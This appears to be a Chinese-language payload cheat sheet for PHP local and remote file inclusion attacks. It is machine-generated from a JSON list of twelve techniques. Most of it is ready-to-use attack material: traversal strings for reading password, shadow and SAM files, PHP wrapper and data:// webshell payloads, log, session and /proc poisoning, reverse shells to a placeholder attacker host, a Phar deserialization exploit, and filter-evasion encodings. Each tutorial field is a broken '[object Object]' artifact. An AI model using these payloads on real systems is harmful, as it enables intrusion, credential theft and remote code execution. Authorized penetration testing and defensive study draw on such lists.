# LFI/RFI文件包含 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（12 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. 本地文件包含

- **id:** `lfi-basic`
- **分类:** LFI/RFI文件包含 / 本地包含
- **tags:** `lfi` `local` `file` `inclusion`

本地文件包含漏洞利用技术

**前置条件**

- 存在文件包含功能
- 用户可控制包含路径

**利用步骤**

#### 1. 探测LFI

```
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=..\..\..\windows\win.ini
?page=php://filter/convert.base64-encode/resource=index.php
```

探测本地文件包含

| 片段 | 说明 | 类型 |
|---|---|---|
| `../` | 上级目录遍历 | path |
| `etc/passwd` | Linux用户文件 | value |

#### 2. 读取敏感文件

```
../../../etc/passwd
../../../etc/shadow
../../../var/log/apache2/access.log
../../../proc/self/environ
../../../proc/self/cmdline
```

读取Linux敏感文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `/proc/self/` | 当前进程信息目录 | path |
| `environ` | 环境变量文件 | value |

> platform: `linux`

#### 3. PHP伪协议

```
php://filter/convert.base64-encode/resource=config.php
php://input (POST数据作为输入)
php://data://text/plain,<?php phpinfo();?>
phar://archive.zip/shell.php
```

使用PHP伪协议

| 片段 | 说明 | 类型 |
|---|---|---|
| `php://filter` | PHP Filter伪协议 | value |
| `php://input` | 读取POST数据 | value |
| `data://` | Data伪协议 | value |

#### 4. 日志投毒

```
1. 包含日志文件: ../../../var/log/apache2/access.log
2. 在User-Agent中注入: <?php system($_GET['c']); ?>
3. 访问: ?file=../../../var/log/apache2/access.log&c=id
```

通过日志投毒获取RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `access.log` | Apache访问日志 | path |
| `User-Agent` | 用户代理头 | value |

> platform: `linux`

**WAF 绕过**

#### 目录遍历绕过

```
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
....\/....\/....\/etc/passwd
```

绕过目录遍历过滤

| 片段 | 说明 | 类型 |
|---|---|---|
| `%252f` | 双重URL编码的斜杠 | encoding |
| `%c0%af` | UTF-8编码的斜杠 | variable |

#### 后缀绕过

```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd/.jpg
php://filter/convert.base64-encode/resource=config.php%00
```

绕过文件后缀检查

| 片段 | 说明 | 类型 |
|---|---|---|
| `%00` | 空字节截断 | encoding |

**教程**

[object Object]

---

### 2. 远程文件包含

- **id:** `rfi-basic`
- **分类:** LFI/RFI文件包含 / 远程包含
- **tags:** `rfi` `remote` `file` `inclusion`

远程文件包含漏洞利用技术

**前置条件**

- 存在文件包含功能
- allow_url_include=On
- 用户可控制包含路径

**利用步骤**

#### 1. 探测RFI

```
?file=http://attacker.com/shell.txt
?file=http://attacker.com/shell.txt%00
?file=http://attacker.com/shell.txt?
```

探测远程文件包含

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://` | 远程URL协议 | domain |
| `attacker.com` | 攻击者服务器 | domain |
| `%00` | 空字节截断绕过后缀 | encoding |

#### 2. 托管恶意文件

```
# shell.txt内容
<?php system($_GET['cmd']); ?>

# 访问
?file=http://attacker.com/shell.txt&cmd=id
```

托管恶意文件并执行

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |

#### 3. 反弹Shell

```
# shell.txt内容
<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# 或使用
<?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `system()` | 系统命令执行 | function |

> platform: `linux`

#### 4. 使用data协议

```
?file=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

使用data协议执行代码

| 片段 | 说明 | 类型 |
|---|---|---|
| `data://` | Data伪协议 | value |
| `text/plain` | MIME类型 | value |
| `base64` | Base64编码 | encoding |

**WAF 绕过**

#### 双写绕过

```
?file=htthttp://p://attacker.com/shell.txt
?file=http://attackerattacker.com.com/shell.txt
```

双写绕过关键字过滤

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=htthttp://p://attacker.com/shell.txt ?file=http://attackerattacker.com.co` | 攻击载荷 | value |

#### 大小写混淆

```
?file=HtTp://attacker.com/shell.txt
?file=HTTP://attacker.com/shell.txt
```

大小写混淆绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=HtTp://attacker.com/shell.txt ?file=HTTP://attacker.com/shell.txt` | 攻击载荷 | value |

#### 协议替换

```
?file=ftp://attacker.com/shell.txt
?file=php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt
```

使用其他协议

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=ftp://attacker.com/shell.txt ?file=php://filter/convert.base64-encode/res` | 攻击载荷 | value |

**教程**

[object Object]

---

### 3. 日志投毒LFI

- **id:** `lfi-log-poison`
- **分类:** LFI/RFI文件包含 / 日志投毒
- **tags:** `lfi` `log` `poison` `rce`

通过日志投毒实现LFI到RCE

**前置条件**

- 存在LFI漏洞
- 可包含日志文件
- 日志文件可写

**利用步骤**

#### 1. 探测日志文件位置

```
# Apache日志
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/httpd/access_log
../../../var/log/nginx/access.log

# 系统日志
../../../var/log/auth.log
../../../var/log/syslog
```

探测日志文件位置

| 片段 | 说明 | 类型 |
|---|---|---|
| `access.log` | Apache访问日志 | path |
| `error.log` | Apache错误日志 | path |

> platform: `linux`

#### 2. 投毒User-Agent

```
# 使用curl投毒
curl -A "<?php system($_GET['c']); ?>" http://target.com/

# 或使用Burp Suite修改User-Agent
User-Agent: <?php system($_GET['c']); ?>
```

在User-Agent中注入代码

| 片段 | 说明 | 类型 |
|---|---|---|
| `-A` | curl设置User-Agent | parameter |
| `<?php` | PHP开始标签 | value |

#### 3. 投毒请求路径

```
# 在URL路径中注入
curl http://target.com/<?php system($_GET['c']); ?>

# URL编码
curl http://target.com/%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E
```

在请求路径中注入代码

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |
| `curl` | HTTP请求工具 | command |

#### 4. 执行命令

```
# 包含日志文件并执行命令
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/apache2/access.log&c=whoami
?file=../../../var/log/apache2/access.log&c=cat /etc/passwd
```

包含日志文件执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `../` | 目录回溯 | technique |
| `/etc/passwd` | 系统文件 | path |

> platform: `linux`

#### 5. 反弹Shell

```
?file=../../../var/log/apache2/access.log&c=bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `../` | 路径穿越 | path |

> platform: `linux`

**WAF 绕过**

#### 编码绕过

```
# 使用Base64编码
<?php eval(base64_decode($_GET['c'])); ?>
# 然后传递Base64编码的命令
```

WAF绕过技术

| 片段 | 说明 | 类型 |
|---|---|---|
| `eval()` | 代码执行 | function |
| `base64_decode` | Base64解码 | function |

**教程**

[object Object]

---

### 4. PHP伪协议利用

- **id:** `lfi-wrapper`
- **分类:** LFI/RFI文件包含 / 伪协议
- **tags:** `lfi` `wrapper` `php` `protocol`

利用PHP伪协议进行LFI攻击

**前置条件**

- 存在LFI漏洞
- PHP环境
- 伪协议未禁用

**利用步骤**

#### 1. php://filter

```
# 读取源码(Base64)
?file=php://filter/convert.base64-encode/resource=config.php

# 读取源码(Rot13)
?file=php://filter/read=string.rot13/resource=config.php

# 多重过滤器
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php
```

使用php://filter读取源码

| 片段 | 说明 | 类型 |
|---|---|---|
| `php://filter` | PHP Filter伪协议 | value |
| `convert.base64-encode` | Base64编码过滤器 | value |
| `resource=` | 指定资源文件 | value |

#### 2. php://input

```
# POST执行PHP代码
?file=php://input
POST: <?php system('id'); ?>

# 执行任意代码
POST: <?php phpinfo(); ?>
POST: <?php echo file_get_contents('/etc/passwd'); ?>
```

使用php://input执行代码

| 片段 | 说明 | 类型 |
|---|---|---|
| `php://input` | 读取POST数据流 | value |
| `POST` | POST请求体 | method |

#### 3. data://协议

```
# 直接执行代码
?file=data://text/plain,<?php system('id'); ?>

# Base64编码
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# 执行任意命令
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
```

使用data://协议执行代码

| 片段 | 说明 | 类型 |
|---|---|---|
| `data://` | Data伪协议 | value |
| `text/plain` | MIME类型 | value |

#### 4. phar://协议

```
# 创建phar文件
<?php
$p = new Phar('shell.phar');
$p->addFromString('shell.txt', '<?php system($_GET["c"]); ?>');
?>

# 包含phar
?file=phar://shell.phar/shell.txt&c=id
```

使用phar://协议

| 片段 | 说明 | 类型 |
|---|---|---|
| `phar://` | PHP归档协议 | value |
| `shell.phar` | Phar文件 | value |

#### 5. zip://协议

```
# 创建zip文件
zip shell.zip shell.txt
# shell.txt内容: <?php system($_GET['c']); ?>

# 包含zip
?file=zip://shell.zip%23shell.txt&c=id

# 使用jpg+zip
copy shell.jpg+shell.zip shell.jpg
?file=zip://shell.jpg%23shell.txt&c=id
```

使用zip://协议

| 片段 | 说明 | 类型 |
|---|---|---|
| `zip://` | ZIP协议 | value |
| `%23` | URL编码的# | encoding |

**WAF 绕过**

#### 大小写混淆

```
?file=Php://filter/convert.base64-encode/resource=config.php
?file=DATA://text/plain,<?php system('id'); ?>
```

大小写混淆绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 执行系统命令 | function |
| `base64` | Base64编码 | encoding |
| `php://filter` | PHP流过滤器 | technique |
| `data://` | 数据流协议 | technique |

#### 双重URL编码

```
?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php
?file=%70%68%70%3a%2f%2finput
```

双重URL编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php ?file=%70%68` | 攻击载荷 | value |

**教程**

[object Object]

---

### 5. 目录遍历技术

- **id:** `lfi-traversal`
- **分类:** LFI/RFI文件包含 / 目录遍历
- **tags:** `lfi` `traversal` `bypass` `path`

LFI目录遍历绕过技术

**前置条件**

- 存在LFI漏洞
- 存在路径过滤

**利用步骤**

#### 1. 基础遍历

```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..\..\..\windows\win.ini
```

基础目录遍历

| 片段 | 说明 | 类型 |
|---|---|---|
| `../` | 目录回溯 | technique |
| `/etc/passwd` | 系统文件 | path |
| `..\\` | Windows路径回溯 | technique |

#### 2. 绕过删除../

```
....//....//....//etc/passwd
....//....//etc/passwd
..././..././..././etc/passwd
```

绕过删除../的过滤

| 片段 | 说明 | 类型 |
|---|---|---|
| `....//` | 删除../后变成../ | value |
| `..././` | 删除../后变成../ | value |

#### 3. URL编码绕过

```
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

URL编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `%2f` | 斜杠URL编码 | encoding |
| `%252f` | 双重URL编码 | encoding |
| `%2e%2e` | 点号URL编码 | encoding |

#### 4. Unicode编码绕过

```
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```

Unicode编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `%c0%af` | UTF-8编码的斜杠 | variable |
| `%c1%9c` | UTF-8编码的反斜杠 | variable |

#### 5. 绝对路径绕过

```
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:/windows/win.ini
C:\windows\system32\config\sam
```

使用绝对路径

| 片段 | 说明 | 类型 |
|---|---|---|
| `/etc/passwd` | 敏感文件路径 | path |

**WAF 绕过**

#### 混合编码

```
..%2f..%c0%af..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

混合编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `..%2f..%c0%af..%2fetc/passwd %2e%2e/%2e%2e/%2e%2e/etc/passwd` | 攻击载荷 | value |

#### 空字节截断

```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
```

空字节截断绕过后缀

| 片段 | 说明 | 类型 |
|---|---|---|
| `%00` | 空字节截断 | encoding |

#### 点号截断(Windows)

```
../../../windows/win.ini.
../../../windows/win.ini...
../../../boot.ini……
```

Windows点号截断

| 片段 | 说明 | 类型 |
|---|---|---|
| `../../../windows/win.ini. ../../../windows/win.ini... ../../../boot.ini……` | 攻击载荷 | value |

> platform: `windows`

**教程**

[object Object]

---

### 6. PHP Filter链攻击

- **id:** `lfi-php-filter`
- **分类:** LFI/RFI文件包含 / PHP Filter
- **tags:** `lfi` `php` `filter` `chain`

利用PHP Filter链进行LFI攻击

**前置条件**

- 存在LFI漏洞
- PHP环境
- filter伪协议可用

**利用步骤**

#### 1. 读取源码

```
# Base64编码读取
?file=php://filter/convert.base64-encode/resource=index.php

# Rot13读取
?file=php://filter/read=string.rot13/resource=index.php

# 字符转换
?file=php://filter/read=string.toupper/resource=index.php
```

使用Filter读取源码

| 片段 | 说明 | 类型 |
|---|---|---|
| `convert.base64-encode` | Base64编码过滤器 | value |
| `string.rot13` | Rot13编码过滤器 | value |

#### 2. 多重过滤器

```
# 多重编码
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php

# 去除PHP标签
?file=php://filter/read=string.strip_tags/resource=index.php
```

使用多重过滤器

| 片段 | 说明 | 类型 |
|---|---|---|
| `|` | 过滤器链接符 | operator |
| `string.strip_tags` | 去除HTML/PHP标签 | value |

#### 3. Filter链RCE

```
# 使用iconv过滤器
?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# 使用zlib压缩
?file=php://filter/zlib.deflate/resource=index.php
?file=php://filter/zlib.inflate/resource=data
```

使用高级过滤器

| 片段 | 说明 | 类型 |
|---|---|---|
| `php://filter` | PHP过滤器 | method |

#### 4. 读取配置文件

```
# WordPress配置
?file=php://filter/convert.base64-encode/resource=wp-config.php

# Laravel .env
?file=php://filter/convert.base64-encode/resource=../.env

# ThinkPHP配置
?file=php://filter/convert.base64-encode/resource=application/database.php
```

读取常见框架配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `php://filter` | PHP过滤器 | method |
| `../` | 路径穿越 | path |

**WAF 绕过**

#### 大小写混淆

```
?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php
?file=PhP://FiLtEr/convert.base64-encode/resource=config.php
```

大小写混淆绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php ?file=PhP://FiLtEr` | 攻击载荷 | value |

#### 编码绕过

```
?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config.php
```

URL编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config` | 攻击载荷 | value |

**教程**

[object Object]

---

### 7. PHP Input执行

- **id:** `lfi-php-input`
- **分类:** LFI/RFI文件包含 / PHP Input
- **tags:** `lfi` `php` `input` `rce`

利用php://input执行PHP代码

**前置条件**

- 存在LFI漏洞
- allow_url_include=On
- POST方法可用

**利用步骤**

#### 1. 基础执行

```
# GET请求
GET ?file=php://input

# POST数据
POST: <?php system('id'); ?>
POST: <?php echo 'Hello'; ?>
```

使用php://input执行代码

| 片段 | 说明 | 类型 |
|---|---|---|
| `php://input` | 读取POST数据流 | value |
| `<?php` | PHP开始标签 | value |

#### 2. 命令执行

```
# 执行系统命令
POST: <?php system($_GET['c']); ?>
# 然后访问: ?file=php://input&c=id

# 使用exec
POST: <?php echo exec('id'); ?>

# 使用shell_exec
POST: <?php echo shell_exec('id'); ?>
```

执行系统命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 执行命令并输出 | function |
| `exec()` | 执行命令返回最后一行 | function |
| `shell_exec()` | 执行命令返回全部输出 | function |

#### 3. 文件操作

```
# 读取文件
POST: <?php echo file_get_contents('/etc/passwd'); ?>

# 写入文件
POST: <?php file_put_contents('shell.php', '<?php system($_GET["c"]); ?>'); ?>

# 列出目录
POST: <?php print_r(scandir('.')); ?>
```

文件操作

#### 4. 反弹Shell

```
POST: <?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# 或使用
POST: <?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `system()` | 系统命令执行 | function |

> platform: `linux`

**WAF 绕过**

#### 编码绕过

```
# Base64编码
POST: <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?>
# 解码后: system($_GET['c']);

# Rot13编码
POST: <?php eval(str_rot13('flfgrz($_TRG['p']);')); ?>
```

使用编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `eval()` | 代码执行 | function |
| `base64_decode` | Base64解码 | function |

#### 短标签

```
POST: <?=system($_GET['c']);?>
POST: <?=`$_GET[c]`?>
```

WAF绕过技术

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |

**教程**

[object Object]

---

### 8. PHP Data协议攻击

- **id:** `lfi-php-data`
- **分类:** LFI/RFI文件包含 / PHP Data
- **tags:** `lfi` `php` `data` `protocol`

利用data://协议执行PHP代码

**前置条件**

- 存在LFI漏洞
- allow_url_include=On
- data协议可用

**利用步骤**

#### 1. 基础执行

```
# 直接执行
?file=data://text/plain,<?php system('id'); ?>

# 执行phpinfo
?file=data://text/plain,<?php phpinfo(); ?>

# 输出文本
?file=data://text/plain,Hello World
```

使用data://协议执行代码

| 片段 | 说明 | 类型 |
|---|---|---|
| `data://` | Data伪协议 | value |
| `text/plain` | MIME类型 | value |
| `,` | 数据分隔符 | value |

#### 2. Base64编码

```
# Base64编码执行
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# 解码后: <?php system('id'); ?>

# 带参数执行
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
```

使用Base64编码

| 片段 | 说明 | 类型 |
|---|---|---|
| `base64` | Base64编码标识 | encoding |
| `PD9waHA...` | Base64编码的PHP代码 | value |

#### 3. 命令执行

```
# 交互式命令
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
?file=data://text/plain,<?php system($_GET['c']); ?>&c=whoami
?file=data://text/plain,<?php system($_GET['c']); ?>&c=cat /etc/passwd
```

执行系统命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 执行系统命令 | function |
| `data://` | 数据流协议 | technique |

#### 4. 反弹Shell

```
?file=data://text/plain,<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# Base64版本
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjFcIiIpOyA/Pg==
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 执行系统命令 | function |
| `data://` | 数据流协议 | technique |

> platform: `linux`

**WAF 绕过**

#### 大小写混淆

```
?file=DATA://TEXT/PLAIN,<?php system('id'); ?>
?file=Data://Text/Plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

大小写混淆绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 执行系统命令 | function |
| `data://` | 数据流协议 | technique |

#### URL编码

```
?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e
```

URL编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%7` | 攻击载荷 | value |

#### MIME类型变换

```
?file=data://text/html,<?php system('id'); ?>
?file=data://application/x-httpd-php,<?php system('id'); ?>
```

变换MIME类型

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 执行系统命令 | function |
| `data://` | 数据流协议 | technique |

**教程**

[object Object]

---

### 9. PHP Zip协议攻击

- **id:** `lfi-php-zip`
- **分类:** LFI/RFI文件包含 / PHP Zip
- **tags:** `lfi` `php` `zip` `archive`

利用zip://协议进行LFI攻击

**前置条件**

- 存在LFI漏洞
- 可上传zip文件
- zip协议可用

**利用步骤**

#### 1. 创建恶意Zip

```
# 创建shell.txt
echo '<?php system($_GET["c"]); ?>' > shell.txt

# 创建zip文件
zip shell.zip shell.txt

# 或使用Python
import zipfile
with zipfile.ZipFile('shell.zip', 'w') as z:
    z.writestr('shell.txt', '<?php system($_GET["c"]); ?>')
```

创建恶意Zip文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `zip` | 创建zip压缩包 | value |
| `shell.txt` | 包含PHP代码的文件 | path |

#### 2. 上传Zip文件

```
# 通过文件上传功能上传shell.zip
# 或通过其他方式上传

# 记住上传路径
/uploads/shell.zip
```

上传Zip文件

#### 3. 包含Zip文件

```
# 使用zip://协议包含
?file=zip://uploads/shell.zip%23shell.txt&c=id

# %23是#的URL编码
# 格式: zip://路径#文件名
```

包含Zip文件执行代码

| 片段 | 说明 | 类型 |
|---|---|---|
| `zip://` | ZIP协议 | value |
| `%23` | #的URL编码 | encoding |
| `shell.txt` | Zip内的文件名 | path |

#### 4. 图片马

```
# 创建图片马
copy image.jpg+shell.zip image.jpg

# 或使用
cat image.jpg shell.zip > image.jpg

# 包含
?file=zip://uploads/image.jpg%23shell.txt&c=id
```

使用图片马上传

| 片段 | 说明 | 类型 |
|---|---|---|
| `%xx` | URL编码 | encoding |

**WAF 绕过**

#### 使用phar://

```
?file=phar://uploads/shell.zip/shell.txt&c=id
# phar://也可以访问zip文件
```

使用phar://协议

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=phar://uploads/shell.zip/shell.txt&c=id #` | 命令/载荷起始 | command |
| ` phar://也可以访问zip文件` | 参数与载荷内容 | value |

#### 压缩包嵌套

```
# 在zip中嵌套zip
zip inner.zip shell.txt
zip outer.zip inner.zip

# 包含
?file=zip://outer.zip%23inner.zip%23shell.txt&c=id
```

压缩包嵌套绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 在zip中嵌套zip zip inner.zip shell.txt zip outer.zip inner.zip  # 包含 ?file=zip://outer.zip%23inner.zip%23shell.txt&c=id` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 10. Phar反序列化攻击

- **id:** `lfi-phar`
- **分类:** LFI/RFI文件包含 / Phar反序列化
- **tags:** `lfi` `phar` `deserialization` `rce`

利用Phar反序列化进行RCE

**前置条件**

- 存在LFI漏洞
- PHP环境
- phar扩展可用

**利用步骤**

#### 1. 创建Phar文件

```
# 创建恶意Phar
<?php
class Exploit {
    function __destruct() {
        system($_GET['c']);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>
```

创建恶意Phar文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `Phar` | PHP归档类 | value |
| `setMetadata` | 设置元数据(序列化对象) | value |
| `__destruct` | 析构函数，反序列化时调用 | value |

#### 2. 触发反序列化

```
# 通过file_exists触发
?file=phar://exploit.phar&c=id

# 通过file_get_contents触发
?file=phar://exploit.phar/test.txt&c=id

# 通过include触发
?file=phar://exploit.phar&c=id
```

触发Phar反序列化

| 片段 | 说明 | 类型 |
|---|---|---|
| `phar://` | Phar协议 | value |
| `exploit.phar` | Phar文件 | value |

#### 3. 图片马Phar

```
# 创建图片Phar
copy exploit.phar exploit.gif

# 或添加GIF头
cp exploit.phar exploit.gif

# 触发
?file=phar://uploads/exploit.gif&c=id
```

使用图片马Phar

#### 4. 常见Gadget链

```
# Laravel POP链
# Symfony POP链
# WordPress POP链
# ThinkPHP POP链

# 使用phpggc生成
git clone https://github.com/ambionics/phpggc
php phpggc Laravel/RCE1 system id > exploit.phar
```

使用常见Gadget链

**WAF 绕过**

#### Base64编码

```
# 将Phar内容Base64编码
# 然后解码触发
```

Base64编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 将Phar内容Base64编码 # 然后解码触发` | 参数与载荷内容 | value |

#### 伪协议组合

```
?file=php://filter/convert.base64-encode/resource=phar://exploit.phar
# 组合使用
```

伪协议组合

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=php://filter/convert.base64-encode/resource=phar://exploit.phar #` | 命令/载荷起始 | command |
| ` 组合使用` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 11. Session文件包含

- **id:** `lfi-session`
- **分类:** LFI/RFI文件包含 / Session包含
- **tags:** `lfi` `session` `file` `inclusion`

利用Session文件进行LFI攻击

**前置条件**

- 存在LFI漏洞
- 可控制Session内容
- 知道Session路径

**利用步骤**

#### 1. 探测Session路径

```
# Linux默认路径
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sess_[PHPSESSID]
/var/lib/php7/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
/c:/windows/temp/sess_[PHPSESSID]
```

探测Session存储路径

| 片段 | 说明 | 类型 |
|---|---|---|
| `sess_` | Session文件前缀 | value |
| `PHPSESSID` | Session ID值 | value |

#### 2. 控制Session内容

```
# 通过用户输入控制Session
# 例如用户名、个人简介等
username: <?php system($_GET['c']); ?>

# 或通过Cookie
Set-Cookie: PHPSESSID=malicious
```

控制Session内容

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |

#### 3. 包含Session文件

```
# 包含Session文件
?file=/var/lib/php/sessions/sess_abc123&c=id

# 或使用相对路径
?file=../../../var/lib/php/sessions/sess_abc123&c=id
```

包含Session文件执行代码

| 片段 | 说明 | 类型 |
|---|---|---|
| `../` | 路径穿越 | path |

#### 4. Session竞争条件

```
# 利用Session竞争
# 1. 持续写入恶意代码到Session
# 2. 同时包含Session文件
# 3. 在Session被清理前执行
```

利用Session竞争条件

**WAF 绕过**

#### Session ID预测

```
# 尝试预测Session ID
# 常见模式: md5(ip.time.random)
# 暴力枚举Session ID
```

预测Session ID

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 尝试预测Session ID # 常见模式: md5(ip.time.random) # 暴力枚举Session ID` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 12. Proc文件系统利用

- **id:** `lfi-proc`
- **分类:** LFI/RFI文件包含 / Proc文件系统
- **tags:** `lfi` `proc` `linux` `environ`

利用/proc文件系统进行LFI攻击

**前置条件**

- 存在LFI漏洞
- Linux系统
- /proc可访问

**利用步骤**

#### 1. 读取进程信息

```
# 当前进程信息
/proc/self/cmdline
/proc/self/environ
/proc/self/cwd
/proc/self/exe
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
```

读取当前进程信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `/proc/self/` | 当前进程目录 | path |
| `cmdline` | 启动命令 | value |
| `environ` | 环境变量 | value |
| `cwd` | 当前工作目录 | value |

> platform: `linux`

#### 2. 读取环境变量

```
?file=../../../proc/self/environ

# 在User-Agent中注入
User-Agent: <?php system($_GET['c']); ?>

# 包含执行
?file=../../../proc/self/environ&c=id
```

读取环境变量执行代码

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |
| `../` | 路径穿越 | path |

> platform: `linux`

#### 3. 通过fd读取日志

```
# fd文件描述符
/proc/self/fd/10
/proc/self/fd/20

# 尝试不同编号找到日志
?file=../../../proc/self/fd/10
```

通过fd读取日志

| 片段 | 说明 | 类型 |
|---|---|---|
| `../` | 路径穿越 | path |

> platform: `linux`

#### 4. 读取其他进程

```
# 枚举进程
/proc/[pid]/cmdline
/proc/[pid]/environ
/proc/[pid]/maps

# 暴力枚举
?file=../../../proc/1/cmdline
?file=../../../proc/2/cmdline
```

读取其他进程信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `../` | 路径穿越 | path |

> platform: `linux`

**WAF 绕过**

#### 使用self

```
?file=/proc/self/environ
?file=proc/self/environ
```

使用self引用

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=/proc/self/environ ?file=proc/self/environ` | 攻击载荷 | value |

> platform: `linux`

**教程**

[object Object]
